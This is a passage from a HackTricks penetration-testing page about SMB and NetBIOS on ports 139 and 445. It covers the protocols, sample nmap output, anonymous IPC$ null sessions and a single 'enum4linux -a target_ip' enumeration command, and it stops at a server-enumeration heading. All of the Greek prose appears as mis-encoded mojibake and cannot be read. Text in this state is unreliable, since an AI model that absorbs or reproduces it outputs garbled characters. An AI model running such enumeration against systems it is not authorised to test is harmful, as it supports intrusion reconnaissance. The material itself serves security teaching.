# 139,445 - Pentesting SMB

<details>

<summary><strong>ÎœÎ¬Î¸ÎµÏ„Îµ Ï„Î¿ Ï‡Î¬ÎºÎ¹Î½Î³Îº ÏƒÏ„Î¿ AWS Î±Ï€ÏŒ Ï„Î¿ Î¼Î·Î´Î­Î½ Î¼Î­Ï‡ÏÎ¹ Ï„Î¿Î½ Î®ÏÏ‰Î± Î¼Îµ Ï„Î¿</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Î•Î¹Î´Î¹ÎºÏŒÏ‚ Red Team AWS Ï„Î¿Ï… HackTricks)</strong></a><strong>!</strong></summary>

Î†Î»Î»Î¿Î¹ Ï„ÏÏŒÏ€Î¿Î¹ Ï…Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î·Ï‚ Ï„Î¿Ï… HackTricks:

* Î‘Î½ Î¸Î­Î»ÎµÏ„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î·Î½ **ÎµÏ„Î±Î¹ÏÎµÎ¯Î± ÏƒÎ±Ï‚ Î´Î¹Î±Ï†Î·Î¼Î¹ÏƒÎ¼Î­Î½Î· ÏƒÏ„Î¿ HackTricks** Î® Î½Î± **ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÏ„Îµ Ï„Î¿ HackTricks ÏƒÎµ Î¼Î¿ÏÏ†Î® PDF** ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î± [**Î£Î§Î•Î”Î™Î‘ Î£Î¥ÎÎ”Î¡ÎŸÎœÎ—Î£**](https://github.com/sponsors/carlospolop)!
* Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï„Î¿ [**ÎµÏ€Î¯ÏƒÎ·Î¼Î¿ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Î‘Î½Î±ÎºÎ±Î»ÏÏˆÏ„Îµ [**Ï„Î·Î½ ÎŸÎ¹ÎºÎ¿Î³Î­Î½ÎµÎ¹Î± PEASS**](https://opensea.io/collection/the-peass-family), Ï„Î· ÏƒÏ…Î»Î»Î¿Î³Î® Î¼Î±Ï‚ Î±Ï€ÏŒ Î±Ï€Î¿ÎºÎ»ÎµÎ¹ÏƒÏ„Î¹ÎºÎ¬ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î· [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î± Ï‡Î¬ÎºÎ¹Î½Î³Îº ÎºÏŒÎ»Ï€Î± ÏƒÎ±Ï‚ Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± Ï„Î¿Ï… github.

</details>

## **Î˜ÏÏÎ± 139**

Î¤Î¿ _**Î’Î±ÏƒÎ¹ÎºÏŒ Î£ÏÏƒÏ„Î·Î¼Î± Î•Î¹ÏƒÏŒÎ´Î¿Ï…-Î•Î¾ÏŒÎ´Î¿Ï… Î”Î¹ÎºÏ„ÏÎ¿Ï…**_\*\* (NetBIOS)\*\* ÎµÎ¯Î½Î±Î¹ Î­Î½Î± Ï€ÏÏ‰Ï„ÏŒÎºÎ¿Î»Î»Î¿ Î»Î¿Î³Î¹ÏƒÎ¼Î¹ÎºÎ¿Ï ÏƒÏ‡ÎµÎ´Î¹Î±ÏƒÎ¼Î­Î½Î¿ Î³Î¹Î± Î½Î± ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ ÏƒÎµ ÎµÏ†Î±ÏÎ¼Î¿Î³Î­Ï‚, Î—/Î¥ ÎºÎ±Î¹ ÎµÏ€Î¹Ï†Î¬Î½ÎµÎ¹ÎµÏ‚ ÎµÏÎ³Î±ÏƒÎ¯Î±Ï‚ ÎµÎ½Ï„ÏŒÏ‚ ÎµÎ½ÏŒÏ‚ Ï„Î¿Ï€Î¹ÎºÎ¿Ï Î´Î¹ÎºÏ„ÏÎ¿Ï… (LAN) Î½Î± Î±Î»Î»Î·Î»ÎµÏ€Î¹Î´ÏÎ¿ÏÎ½ Î¼Îµ Ï„Î¿ Î´Î¹ÎºÏ„Ï…Î±ÎºÏŒ Ï…Î»Î¹ÎºÏŒ ÎºÎ±Î¹ **Î½Î± Î´Î¹ÎµÏ…ÎºÎ¿Î»ÏÎ½Î¿Ï…Î½ Ï„Î· Î¼ÎµÏ„Î¬Î´Î¿ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ ÏƒÏ„Î¿ Î´Î¯ÎºÏ„Ï…Î¿**. Î— Ï„Î±Ï…Ï„Î¿Ï€Î¿Î¯Î·ÏƒÎ· ÎºÎ±Î¹ Î· ÎµÎ½Ï„Î¿Ï€Î¹ÏƒÎ¼ÏŒÏ‚ ÎµÏ†Î±ÏÎ¼Î¿Î³ÏÎ½ Î»Î¿Î³Î¹ÏƒÎ¼Î¹ÎºÎ¿Ï Ï€Î¿Ï… Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¿ÏÎ½ ÏƒÎµ Î­Î½Î± Î´Î¯ÎºÏ„Ï…Î¿ NetBIOS ÎµÏ€Î¹Ï„Ï…Î³Ï‡Î¬Î½Î¿Î½Ï„Î±Î¹ Î¼Î­ÏƒÏ‰ Ï„Ï‰Î½ Î¿Î½Î¿Î¼Î¬Ï„Ï‰Î½ NetBIOS Ï„Î¿Ï…Ï‚, Ï„Î± Î¿Ï€Î¿Î¯Î± Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï†Ï„Î¬ÏƒÎ¿Ï…Î½ Î¼Î­Ï‡ÏÎ¹ 16 Ï‡Î±ÏÎ±ÎºÏ„Î®ÏÎµÏ‚ ÏƒÎµ Î¼Î®ÎºÎ¿Ï‚ ÎºÎ±Î¹ ÏƒÏ…Ï‡Î½Î¬ Î´Î¹Î±Ï†Î­ÏÎ¿Ï…Î½ Î±Ï€ÏŒ Ï„Î¿ ÏŒÎ½Î¿Î¼Î± Ï„Î¿Ï… Ï…Ï€Î¿Î»Î¿Î³Î¹ÏƒÏ„Î®. ÎœÎ¹Î± ÏƒÏ…Î½ÎµÎ´ÏÎ¯Î± NetBIOS Î¼ÎµÏ„Î±Î¾Ï Î´ÏÎ¿ ÎµÏ†Î±ÏÎ¼Î¿Î³ÏÎ½ Î¾ÎµÎºÎ¹Î½Î¬ ÏŒÏ„Î±Î½ Î¼Î¹Î± ÎµÏ†Î±ÏÎ¼Î¿Î³Î® (Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³ÏÎ½ Ï‰Ï‚ Ï€ÎµÎ»Î¬Ï„Î·Ï‚) ÎµÎºÎ´Î¯Î´ÎµÎ¹ Î¼Î¹Î± ÎµÎ½Ï„Î¿Î»Î® Î³Î¹Î± "ÎºÎ»Î®ÏƒÎ·" Î¼Î¹Î±Ï‚ Î¬Î»Î»Î·Ï‚ ÎµÏ†Î±ÏÎ¼Î¿Î³Î®Ï‚ (Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³ÏÎ½ Ï‰Ï‚ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®Ï‚) Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î· **Î˜ÏÏÎ± TCP 139**.

```
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
```

## Î˜ÏÏÎ± 445

Î¤ÎµÏ‡Î½Î¹ÎºÎ¬, Î· Î˜ÏÏÎ± 139 Î±Î½Î±Ï†Î­ÏÎµÏ„Î±Î¹ Ï‰Ï‚ 'NBT Ï€Î¬Î½Ï‰ Î±Ï€ÏŒ IP', ÎµÎ½Ï Î· Î˜ÏÏÎ± 445 Î±Î½Î±Î³Î½Ï‰ÏÎ¯Î¶ÎµÏ„Î±Î¹ Ï‰Ï‚ 'SMB Ï€Î¬Î½Ï‰ Î±Ï€ÏŒ IP'. Î¤Î¿ Î±ÎºÏÏ‰Î½ÏÎ¼Î¹Î¿ **SMB** ÏƒÎ·Î¼Î±Î¯Î½ÎµÎ¹ '**Server Message Blocks**', Ï„Î¿ Î¿Ï€Î¿Î¯Î¿ ÎµÎ¯Î½Î±Î¹ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î³Î½Ï‰ÏƒÏ„ÏŒ ÏƒÏÎ³Ï‡ÏÎ¿Î½Î± Ï‰Ï‚ Ï„Î¿ **Common Internet File System (CIFS)**. Î©Ï‚ Ï€ÏÏ‰Ï„ÏŒÎºÎ¿Î»Î»Î¿ Î´Î¹ÎºÏ„ÏÎ¿Ï… ÏƒÏ„Î¿ ÎµÏ€Î¯Ï€ÎµÎ´Î¿ ÎµÏ†Î±ÏÎ¼Î¿Î³Î®Ï‚, Ï„Î¿ SMB/CIFS Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ ÎºÏ…ÏÎ¯Ï‰Ï‚ Î³Î¹Î± Ï„Î· Î´Ï…Î½Î±Ï„ÏŒÏ„Î·Ï„Î± ÎºÎ¿Î¹Î½Î®Ï‚ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ ÏƒÎµ Î±ÏÏ‡ÎµÎ¯Î±, ÎµÎºÏ„Ï…Ï€Ï‰Ï„Î­Ï‚, ÏƒÎµÎ¹ÏÎ¹Î±ÎºÎ­Ï‚ Î¸ÏÏÎµÏ‚, ÎºÎ±Î¹ Î³Î¹Î± Ï„Î· Î´Î¹ÎµÏ…ÎºÏŒÎ»Ï…Î½ÏƒÎ· Î´Î¹Î±Ï†ÏŒÏÏ‰Î½ Î¼Î¿ÏÏ†ÏÎ½ ÎµÏ€Î¹ÎºÎ¿Î¹Î½Ï‰Î½Î¯Î±Ï‚ Î¼ÎµÏ„Î±Î¾Ï ÎºÏŒÎ¼Î²Ï‰Î½ ÏƒÎµ Î­Î½Î± Î´Î¯ÎºÏ„Ï…Î¿.

Î“Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, ÏƒÏ„Î¿ Ï€Î»Î±Î¯ÏƒÎ¹Î¿ Ï„Ï‰Î½ Windows, Ï„Î¿ SMB Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³ÎµÎ¯ Î±Ï€ÎµÏ…Î¸ÎµÎ¯Î±Ï‚ Ï€Î¬Î½Ï‰ Î±Ï€ÏŒ TCP/IP, ÎµÎ¾Î±Î»ÎµÎ¯Ï†Î¿Î½Ï„Î±Ï‚ Ï„Î·Î½ Î±Î½Î¬Î³ÎºÎ· Î³Î¹Î± NetBIOS Ï€Î¬Î½Ï‰ Î±Ï€ÏŒ TCP/IP, Î¼Î­ÏƒÏ‰ Ï„Î·Ï‚ Ï‡ÏÎ®ÏƒÎ·Ï‚ Ï„Î·Ï‚ Î¸ÏÏÎ±Ï‚ 445. Î‘Î½Ï„Î¯ÏƒÏ„ÏÎ¿Ï†Î±, ÏƒÎµ Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÎ¬ ÏƒÏ…ÏƒÏ„Î®Î¼Î±Ï„Î±, Ï€Î±ÏÎ±Ï„Î·ÏÎµÎ¯Ï„Î±Î¹ Î· Ï‡ÏÎ®ÏƒÎ· Ï„Î·Ï‚ Î¸ÏÏÎ±Ï‚ 139, Ï…Ï€Î¿Î´ÎµÎ¹ÎºÎ½ÏÎ¿Î½Ï„Î±Ï‚ ÏŒÏ„Î¹ Ï„Î¿ SMB ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ ÏƒÎµ ÏƒÏ…Î½Î´Ï…Î±ÏƒÎ¼ÏŒ Î¼Îµ Ï„Î¿ NetBIOS Ï€Î¬Î½Ï‰ Î±Ï€ÏŒ TCP/IP.

```
445/tcp   open  microsoft-ds  Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
```

### SMB

Î¤Î¿ Ï€ÏÏ‰Ï„ÏŒÎºÎ¿Î»Î»Î¿ **Server Message Block (SMB)**, Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³ÏÎ½Ï„Î±Ï‚ ÏƒÎµ Î­Î½Î± Î¼Î¿Î½Ï„Î­Î»Î¿ **client-server**, ÏƒÏ‡ÎµÎ´Î¹Î¬ÏƒÏ„Î·ÎºÎµ Î³Î¹Î± Ï„Î¿Î½ Î­Î»ÎµÎ³Ï‡Î¿ Ï„Î·Ï‚ **Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ ÏƒÎµ Î±ÏÏ‡ÎµÎ¯Î±**, ÎºÎ±Ï„Î±Î»ÏŒÎ³Î¿Ï…Ï‚ ÎºÎ±Î¹ Î¬Î»Î»Î¿Ï…Ï‚ Î´Î¹ÎºÏ„Ï…Î±ÎºÎ¿ÏÏ‚ Ï€ÏŒÏÎ¿Ï…Ï‚ ÏŒÏ€Ï‰Ï‚ ÎµÎºÏ„Ï…Ï€Ï‰Ï„Î­Ï‚ ÎºÎ±Î¹ Î´ÏÎ¿Î¼Î¿Î»Î¿Î³Î·Ï„Î­Ï‚. Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ ÎºÏ…ÏÎ¯Ï‰Ï‚ ÏƒÏ„Î· ÏƒÎµÎ¹ÏÎ¬ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¹ÎºÏÎ½ ÏƒÏ…ÏƒÏ„Î·Î¼Î¬Ï„Ï‰Î½ **Windows**, Ï„Î¿ SMB ÎµÎ¾Î±ÏƒÏ†Î±Î»Î¯Î¶ÎµÎ¹ Î±Î½Ï„Î¹ÏƒÏ„ÏÎ¿Ï†Î® ÏƒÏ…Î¼Î²Î±Ï„ÏŒÏ„Î·Ï„Î±, ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Î½Ï„Î±Ï‚ ÏƒÎµ ÏƒÏ…ÏƒÎºÎµÏ…Î­Ï‚ Î¼Îµ Î½ÎµÏŒÏ„ÎµÏÎµÏ‚ ÎµÎºÎ´ÏŒÏƒÎµÎ¹Ï‚ Ï„Î¿Ï… Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¹ÎºÎ¿Ï ÏƒÏ…ÏƒÏ„Î®Î¼Î±Ï„Î¿Ï‚ Ï„Î·Ï‚ Microsoft Î½Î± Î±Î»Î»Î·Î»ÎµÏ€Î¹Î´ÏÎ¿ÏÎ½ Î±Ï€ÏÎ¿Î²Î»Î·Î¼Î¬Ï„Î¹ÏƒÏ„Î± Î¼Îµ Î±Ï…Ï„Î­Ï‚ Ï€Î¿Ï… ÎµÎºÏ„ÎµÎ»Î¿ÏÎ½ Ï€Î±Î»Î±Î¹ÏŒÏ„ÎµÏÎµÏ‚ ÎµÎºÎ´ÏŒÏƒÎµÎ¹Ï‚. Î•Ï€Î¹Ï€Î»Î­Î¿Î½, Ï„Î¿ Î­ÏÎ³Î¿ **Samba** Ï€ÏÎ¿ÏƒÏ†Î­ÏÎµÎ¹ Î¼Î¹Î± Î´Ï‰ÏÎµÎ¬Î½ Î»ÏÏƒÎ· Î»Î¿Î³Î¹ÏƒÎ¼Î¹ÎºÎ¿Ï, ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Î½Ï„Î±Ï‚ Ï„Î·Î½ Ï…Î»Î¿Ï€Î¿Î¯Î·ÏƒÎ· Ï„Î¿Ï… SMB ÏƒÎµ ÏƒÏ…ÏƒÏ„Î®Î¼Î±Ï„Î± **Linux** ÎºÎ±Î¹ Unix, Î´Î¹ÎµÏ…ÎºÎ¿Î»ÏÎ½Î¿Î½Ï„Î±Ï‚ Î­Ï„ÏƒÎ¹ Ï„Î· Î´Î¹Î±ÏƒÏ…Î½Î¿ÏÎ¹Î±ÎºÎ® ÎµÏ€Î¹ÎºÎ¿Î¹Î½Ï‰Î½Î¯Î± Î¼Î­ÏƒÏ‰ SMB.

ÎŸÎ¹ ÎºÎ¿Î¹Î½Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹Ï‚, Ï€Î¿Ï… Î±Î½Ï„Î¹Ï€ÏÎ¿ÏƒÏ‰Ï€ÎµÏÎ¿Ï…Î½ **Î¿Ï€Î¿Î¹Î¿Î´Î®Ï€Î¿Ï„Îµ Ï„Î¼Î®Î¼Î± Ï„Î¿Ï… Ï„Î¿Ï€Î¹ÎºÎ¿Ï ÏƒÏ…ÏƒÏ„Î®Î¼Î±Ï„Î¿Ï‚ Î±ÏÏ‡ÎµÎ¯Ï‰Î½**, Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Ï€Î±ÏÎ­Ï‡Î¿Î½Ï„Î±Î¹ Î±Ï€ÏŒ Î­Î½Î± Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® SMB, ÎºÎ±Î¸Î¹ÏƒÏ„ÏÎ½Ï„Î±Ï‚ Ï„Î·Î½ Î¹ÎµÏÎ±ÏÏ‡Î¯Î± Î¿ÏÎ±Ï„Î® ÏƒÎµ Î­Î½Î±Î½ Ï€ÎµÎ»Î¬Ï„Î· ÎµÎ½ Î¼Î­ÏÎµÎ¹ **Î±Î½ÎµÎ¾Î¬ÏÏ„Î·Ï„Î·** Î±Ï€ÏŒ Ï„Î·Î½ Ï€ÏÎ±Î³Î¼Î±Ï„Î¹ÎºÎ® Î´Î¿Î¼Î® Ï„Î¿Ï… Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®. ÎŸÎ¹ **Î›Î¯ÏƒÏ„ÎµÏ‚ Î•Î»Î­Î³Ï‡Î¿Ï… Î ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ (ACLs)**, Ï€Î¿Ï… Î¿ÏÎ¯Î¶Î¿Ï…Î½ Ï„Î± **Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚**, ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Ï…Î½ Ï„Î¿Î½ **Î»ÎµÏ€Ï„Î¿Î´Î¹Î¬ÎºÏÎ¹Ï„Î¿ Î­Î»ÎµÎ³Ï‡Î¿** Ï„Ï‰Î½ Î´Î¹ÎºÎ±Î¹Ï‰Î¼Î¬Ï„Ï‰Î½ Ï‡ÏÎ®ÏƒÏ„Î·, ÏƒÏ…Î¼Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î±Î½Î¿Î¼Î­Î½Ï‰Î½ Ï‡Î±ÏÎ±ÎºÏ„Î·ÏÎ¹ÏƒÏ„Î¹ÎºÏÎ½ ÏŒÏ€Ï‰Ï‚ **`ÎµÎºÏ„Î­Î»ÎµÏƒÎ·`**, **`Î±Î½Î¬Î³Î½Ï‰ÏƒÎ·`** ÎºÎ±Î¹ **`Ï€Î»Î®ÏÎ·Ï‚ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·`**. Î‘Ï…Ï„Î¬ Ï„Î± Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Î±Î½Î±Ï„ÎµÎ¸Î¿ÏÎ½ ÏƒÎµ Î¼ÎµÎ¼Î¿Î½Ï‰Î¼Î­Î½Î¿Ï…Ï‚ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ Î® Î¿Î¼Î¬Î´ÎµÏ‚, Î¼Îµ Î²Î¬ÏƒÎ· Ï„Î¹Ï‚ ÎºÎ¿Î¹Î½Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹Ï‚, ÎºÎ±Î¹ Î´Î¹Î±Ï†Î­ÏÎ¿Ï…Î½ Î±Ï€ÏŒ Ï„Î± Ï„Î¿Ï€Î¹ÎºÎ¬ Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± Ï€Î¿Ï… Î­Ï‡Î¿Ï…Î½ Î¿ÏÎ¹ÏƒÏ„ÎµÎ¯ ÏƒÏ„Î¿ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®.

### ÎšÎ¿Î¹Î½Î¿Ï€Î¿Î¯Î·ÏƒÎ· IPC$

Î— Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î·Î½ ÎºÎ¿Î¹Î½Î¿Ï€Î¿Î¯Î·ÏƒÎ· IPC$ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÏ€Î¹Ï„ÎµÏ…Ï‡Î¸ÎµÎ¯ Î¼Î­ÏƒÏ‰ Î¼Î¹Î±Ï‚ Î±Î½ÏÎ½Ï…Î¼Î·Ï‚ ÎºÎµÎ½Î®Ï‚ ÏƒÏ…Î½ÎµÎ´ÏÎ¯Î±Ï‚, ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Î½Ï„Î±Ï‚ Ï„Î·Î½ Î±Î»Î»Î·Î»ÎµÏ€Î¯Î´ÏÎ±ÏƒÎ· Î¼Îµ Ï…Ï€Î·ÏÎµÏƒÎ¯ÎµÏ‚ Ï€Î¿Ï… ÎµÎºÏ„Î¯Î¸ÎµÎ½Ï„Î±Î¹ Î¼Î­ÏƒÏ‰ Î¿Î½Î¿Î¼Î±ÏƒÎ¼Î­Î½Ï‰Î½ ÏƒÏ‰Î»Î·Î½ÏÏƒÎµÏ‰Î½. Î¤Î¿ ÎµÏÎ³Î±Î»ÎµÎ¯Î¿ `enum4linux` ÎµÎ¯Î½Î±Î¹ Ï‡ÏÎ®ÏƒÎ¹Î¼Î¿ Î³Î¹Î± Î±Ï…Ï„ÏŒÎ½ Ï„Î¿Î½ ÏƒÎºÎ¿Ï€ÏŒ. Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î¿ ÏƒÏ‰ÏƒÏ„Î¬, ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î·Î½ Î±Ï€ÏŒÎºÏ„Î·ÏƒÎ·:

* Î Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î³Î¹Î± Ï„Î¿ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¹ÎºÏŒ ÏƒÏÏƒÏ„Î·Î¼Î±
* Î›ÎµÏ€Ï„Î¿Î¼Î­ÏÎµÎ¹ÎµÏ‚ Î³Î¹Î± Ï„Î¿ Î³Î¿Î½Î¹ÎºÏŒ Ï„Î¿Î¼Î­Î±
* ÎˆÎ½Î± ÏƒÏ…Î³ÎºÏÎ¹Ï„Î¹ÎºÏŒ ÏƒÏ„Î¿Î¹Ï‡ÎµÎ¯Î¿ Ï„Î¿Ï€Î¹ÎºÏÎ½ Ï‡ÏÎ·ÏƒÏ„ÏÎ½ ÎºÎ±Î¹ Î¿Î¼Î¬Î´Ï‰Î½
* Î Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î³Î¹Î± Î´Î¹Î±Î¸Î­ÏƒÎ¹Î¼ÎµÏ‚ ÎºÎ¿Î¹Î½Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹Ï‚ SMB
* Î¤Î·Î½ Î±Ï€Î¿Ï„ÎµÎ»ÎµÏƒÎ¼Î±Ï„Î¹ÎºÎ® Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ® Î±ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚ Ï„Î¿Ï… ÏƒÏ…ÏƒÏ„Î®Î¼Î±Ï„Î¿Ï‚

Î‘Ï…Ï„Î® Î· Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¹ÎºÏŒÏ„Î·Ï„Î± ÎµÎ¯Î½Î±Î¹ ÎºÏÎ¯ÏƒÎ¹Î¼Î· Î³Î¹Î± Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î­Ï‚ Î´Î¹ÎºÏ„ÏÎ¿Ï… ÎºÎ±Î¹ ÎµÏ€Î±Î³Î³ÎµÎ»Î¼Î±Ï„Î¯ÎµÏ‚ Î±ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚ Î³Î¹Î± Î½Î± Î±Î¾Î¹Î¿Î»Î¿Î³Î®ÏƒÎ¿Ï…Î½ Ï„Î·Î½ Î±ÏƒÏ†Î¬Î»ÎµÎ¹Î± Ï„Ï‰Î½ Ï…Ï€Î·ÏÎµÏƒÎ¹ÏÎ½ SMB (Server Message Block) ÏƒÎµ Î­Î½Î± Î´Î¯ÎºÏ„Ï…Î¿. Î¤Î¿ `enum4linux` Ï€Î±ÏÎ­Ï‡ÎµÎ¹ Î¼Î¹Î± Ï€ÎµÏÎ¹ÎµÎºÏ„Î¹ÎºÎ® ÎµÎ¹ÎºÏŒÎ½Î± Ï„Î¿Ï… Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½Ï„Î¿Ï‚ SMB Ï„Î¿Ï… ÏƒÏ„ÏŒÏ‡Î¿Ï… ÏƒÏ…ÏƒÏ„Î®Î¼Î±Ï„Î¿Ï‚, Ï„Î¿ Î¿Ï€Î¿Î¯Î¿ ÎµÎ¯Î½Î±Î¹ Î¿Ï…ÏƒÎ¹ÏÎ´ÎµÏ‚ Î³Î¹Î± Ï„Î·Î½ Î±Î½Î±Î³Î½ÏÏÎ¹ÏƒÎ· Ï€Î¹Î¸Î±Î½ÏÎ½ ÎµÏ…Ï€Î±Î¸ÎµÎ¹ÏÎ½ ÎºÎ±Î¹ Ï„Î· Î´Î¹Î±ÏƒÏ†Î¬Î»Î¹ÏƒÎ· ÏŒÏ„Î¹ Î¿Î¹ Ï…Ï€Î·ÏÎµÏƒÎ¯ÎµÏ‚ SMB ÎµÎ¯Î½Î±Î¹ ÎºÎ±Ï„Î¬Î»Î»Î·Î»Î± Î±ÏƒÏ†Î±Î»Î¹ÏƒÎ¼Î­Î½ÎµÏ‚.

```bash
enum4linux -a target_ip
```

Î¤Î¿ Ï€Î±ÏÎ±Ï€Î¬Î½Ï‰ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± ÎµÎ¯Î½Î±Î¹ Ï€ÏÏ‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Ï„Î¿ `enum4linux` Î³Î¹Î± Î½Î± Ï€ÏÎ±Î³Î¼Î±Ï„Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Î¼Î¹Î± Ï€Î»Î®ÏÎ· Î±Ï€Î±ÏÎ¯Î¸Î¼Î·ÏƒÎ· ÎµÎ½Î±Î½Ï„Î¯Î¿Î½ ÎµÎ½ÏŒÏ‚ ÏƒÏ„ÏŒÏ‡Î¿Ï… Ï€Î¿Ï… ÎºÎ±Î¸Î¿ÏÎ¯Î¶ÎµÏ„Î±Î¹ Î±Ï€ÏŒ Ï„Î¿ `target_ip`.

## Î¤Î¹ ÎµÎ¯Î½Î±Î¹ Ï„Î¿ NTLM

Î‘Î½ Î´ÎµÎ½ Î¾Î­ÏÎµÏ„Îµ Ï„Î¹ ÎµÎ¯Î½Î±Î¹ Ï„Î¿ NTLM Î® Î¸Î­Î»ÎµÏ„Îµ Î½Î± Î¼Î¬Î¸ÎµÏ„Îµ Ï€ÏÏ‚ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³ÎµÎ¯ ÎºÎ±Î¹ Ï€ÏÏ‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎºÎ±Ï„Î±Ï‡ÏÎ±ÏƒÏ„ÎµÎ¯, Î¸Î± Î²ÏÎµÎ¯Ï„Îµ Ï€Î¿Î»Ï ÎµÎ½Î´Î¹Î±Ï†Î­ÏÎ¿Ï…ÏƒÎ± Î±Ï…Ï„Î®Î½ Ï„Î· ÏƒÎµÎ»Î¯Î´Î± Î³Î¹Î± Ï„Î¿ **NTLM** ÏŒÏ€Î¿Ï… ÎµÎ¾Î·Î³ÎµÎ¯Ï„Î±Î¹ **Ï€ÏÏ‚ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³ÎµÎ¯ Î±Ï…Ï„ÏŒ Ï„Î¿ Ï€ÏÏ‰Ï„ÏŒÎºÎ¿Î»Î»Î¿ ÎºÎ±Î¹ Ï€ÏÏ‚ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÏ€Ï‰Ï†ÎµÎ»Î·Î¸ÎµÎ¯Ï„Îµ Î±Ï€ÏŒ Î±Ï…Ï„ÏŒ:**

{% content-ref url="../../windows-hardening/ntlm/" %}
[ntlm](../../windows-hardening/ntlm/)
{% endcontent-ref %}

## **Î‘Ï€Î±ÏÎ¯Î¸Î¼Î·ÏƒÎ· Î”Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®**

